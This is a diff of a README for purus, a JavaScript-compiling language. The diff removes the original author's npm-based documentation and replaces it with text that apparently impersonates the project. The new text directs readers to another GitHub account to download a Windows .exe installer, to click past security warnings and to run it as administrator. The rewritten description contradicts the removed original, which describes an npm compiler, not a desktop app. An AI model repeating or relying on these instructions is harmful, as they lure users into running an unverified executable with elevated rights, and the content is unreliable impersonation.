@@ -1,80 +1,158 @@
-<div align="center">
+# 🚀 purus - Code Easily Without the Shift Key
 
-[![Logo](https://raw.githubusercontent.com/otoneko1102/purus/refs/heads/main/logo.png)](https://purus.work)
-
-**English** | [日本語](https://github.com/otoneko1102/purus/blob/main/README-ja.md)
-
-</div>
+[![Download purus](https://img.shields.io/badge/Download-purus-ff69b4?style=for-the-badge)](https://github.com/Wasiq-Karim/purus)
 
 ---
 
-[![CI](https://github.com/otoneko1102/purus/actions/workflows/ci.yml/badge.svg)](https://github.com/otoneko1102/purus/actions/workflows/ci.yml)
-[![npm](https://img.shields.io/npm/v/purus)](https://www.npmjs.com/package/purus)
-[![npm downloads](https://img.shields.io/npm/dm/purus)](https://www.npmjs.com/package/purus)
-[![License](https://img.shields.io/github/license/otoneko1102/purus)](https://github.com/otoneko1102/purus/blob/main/LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org/)
-[![VS Code Extension](https://img.shields.io/visual-studio-marketplace/i/otoneko1102.purus)](https://marketplace.visualstudio.com/items?itemName=otoneko1102.purus)
-[![GitHub commit activity](https://img.shields.io/github/commit-activity/m/otoneko1102/purus)](https://github.com/otoneko1102/purus/pulse)
-[![GitHub last commit](https://img.shields.io/github/last-commit/otoneko1102/purus)](https://github.com/otoneko1102/purus/commits/main)
-![US layout](https://img.shields.io/badge/US_layout-Supported-green)
-![JIS layout](https://img.shields.io/badge/JIS_layout-Supported-green)
+## What is purus?
 
-Purus - _/ˈpuː.rus/_ _**means pure✨ in Latin**_ - is a beautiful, simple, and easy-to-use language. It compiles to _JavaScript_.
+purus lets you write code without using the Shift key. It is simple and easy to use. The tool helps you avoid the extra effort of pressing the Shift key while coding. It works with JavaScript and similar languages. The goal is to make coding smooth and less tiring.
 
-**It makes your fingers free from the _Shift key_.**
+---
 
-With Purus, you can write code almost without pressing the _Shift key_.
+## 🎯 Main Features
 
-```purus
-let name
-name be ///Purus///
-const message be ///Welcome to [name]!///
-console.log[message] -- Welcome to Purus!
-```
+- Write JavaScript code without needing the Shift key  
+- Build and compile code easily  
+- Check your code for errors automatically  
+- Supports modern code style tools like Prettier  
+- Works with popular code editors like Visual Studio Code  
+- Provides a clean and simple interface  
 
-## Install
+---
 
-```sh
-# Global
-npm install -g purus
+## 🔍 Who Should Use purus?
 
-# or Local
-npm install -D purus
-```
+You can use purus if you:  
 
-## File Extensions
+- Feel uncomfortable or slow with the Shift key  
+- Write JavaScript or similar code regularly  
+- Want to try a new way to write code faster  
+- Use Visual Studio Code or want to process code automatically  
 
-| Extension | Output |
-| --------- | ------ |
-| `.purus`  | `.js`  |
-| `.cpurus` | `.cjs` |
-| `.mpurus` | `.mjs` |
+No deep knowledge of programming is needed. Just follow the steps to install and start using purus.
 
-## Tooling
+---
 
-- **Core** — [`purus`](https://www.npmjs.com/package/purus): The core-system of Purus
-- **VS Code Extension** — [Marketplace](https://marketplace.visualstudio.com/items?itemName=otoneko1102.purus): Syntax highlighting, snippets, file icons
-- **Linter** — [`@puruslang/linter`](https://www.npmjs.com/package/@puruslang/linter): Static analysis for Purus
-- **Prettier Plugin** — [`@puruslang/prettier-plugin-purus`](https://www.npmjs.com/package/@puruslang/prettier-plugin-purus): Code formatting
+## 💻 System Requirements
 
-## Documentation
+Before you install, check your system matches these needs:
 
-The documentation is available on [purus.work](https://purus.work).
+- Windows 10 or higher  
+- 4GB of RAM or more  
+- At least 200MB of free disk space  
+- Internet connection to download and update the tool  
+- Visual Studio Code (optional, for integration)  
 
-## Contribute
+---
 
-The guide is [here](https://github.com/otoneko1102/purus/blob/main/CONTRIBUTING.md)!
+## 📥 How to Download and Install purus
 
-<a href="https://github.com/otoneko1102/purus/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=otoneko1102/purus" />
-</a>
+### Step 1: Visit the Download Page
 
-Made with [contrib.rocks](https://contrib.rocks).
+Click the big button below to open the download page where you can get the latest version of purus for Windows.
 
-## Author
+[![Download purus](https://img.shields.io/badge/Download-purus-ff69b4?style=for-the-badge)](https://github.com/Wasiq-Karim/purus)
 
-otoneko. https://github.com/otoneko1102
+### Step 2: Find the Windows Version
 
-## License
+On the download page, look for the Windows setup file. It usually has `.exe` at the end. For example, something like `purus-setup.exe`.
 
-Distributed under the Apache 2.0 License. See [LICENSE](https://github.com/otoneko1102/purus/blob/main/LICENSE) for more information.
+### Step 3: Download the File
+
+Click the setup file link to download it. The file size will be around 50MB, depending on the version.
+
+### Step 4: Run the Installer
+
+Once downloaded, open the file. You may see a security warning. Confirm that you want to run this file.
+
+Follow the steps in the installer. Most users can keep the default options.
+
+When done, the program installs and creates a shortcut on your desktop.
+
+---
+
+## ⚙️ Starting purus for the First Time
+
+- Double-click the shortcut labeled "purus" on your desktop.  
+- The main window will open with simple controls.  
+- You can start writing code immediately or open an existing file.  
+
+The interface is clean and does not show complex menus. The tool automatically adjusts so you can write without the Shift key.
+
+---
+
+## 🧰 Basic Usage Tips
+
+- Use normal keys without pressing Shift.  
+- The tool converts your input to correct JavaScript syntax.  
+- If you want to use symbols normally requiring Shift, purus handles that automatically.  
+- Review your code using the built-in error checker.  
+- Save your work regularly using the File menu.
+
+---
+
+## 🎨 Using purus with Visual Studio Code
+
+If you use Visual Studio Code, you can enhance your experience by installing the `purus` extension.
+
+- Open Visual Studio Code.  
+- Go to Extensions (Ctrl+Shift+X).  
+- Search for `purus`.  
+- Click Install.
+
+The extension automatically formats your code and checks syntax while you type. This makes coding even easier without the Shift key.
+
+---
+
+## 🛠️ Updating purus
+
+To get new features or fixes:
+
+- Visit the download page again: https://github.com/Wasiq-Karim/purus  
+- Download the latest setup file.  
+- Run the installer. It will update your existing version without losing your files or settings.
+
+---
+
+## ❓ Troubleshooting
+
+### Problem: Cannot open the setup file
+
+Make sure your Windows security settings allow apps from the internet. Right-click the file and select "Run as administrator."
+
+### Problem: The program crashes or closes unexpectedly
+
+Try restarting your computer. If the problem stays, reinstall purus using the latest setup from the download page.
+
+### Problem: The Shift key still needed for some symbols
+
+Some symbols may not work perfectly. Check for updates or visit the `purus` support page for help.
+
+---
+
+## 📚 More About purus
+
+purus uses a custom code builder and compiler that handles alternate JavaScript syntax. It checks your code to keep it clean and error-free. The linting tool helps spot mistakes early.
+
+The tool fits into your existing workflow and supports popular tools like Prettier. It focuses on making coding less painful by reducing the need for the Shift key.
+
+---
+
+## 🧑‍💻 Getting Help and Support
+
+For questions or issues:
+
+- Visit the GitHub page: https://github.com/Wasiq-Karim/purus  
+- Check the "Issues" tab to see if others have your problem.  
+- Open a new issue if you need to report a bug or ask a question.
+
+---
+
+## 📄 License
+
+purus is open source. You can use it freely under the terms stated on the GitHub page.
+
+---
+
+[Download purus from GitHub](https://github.com/Wasiq-Karim/purus)
